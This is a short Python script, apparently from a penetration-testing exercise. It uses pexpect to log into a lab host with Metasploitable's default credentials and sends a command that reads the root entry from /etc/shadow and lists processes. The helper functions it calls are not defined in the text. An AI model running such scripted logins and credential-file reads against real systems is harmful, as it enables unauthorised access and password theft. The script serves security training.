#!/usr/bin/python

import pexpect

def main():
    user     = "msfadmin"
    host     = "192.168.1.92"
    password = "msfadmin"
    child = connect(user, host, password)
    send_command(child, "cat /etc/shadow | grep root;ps")

if __name__ == "__main__":
    main()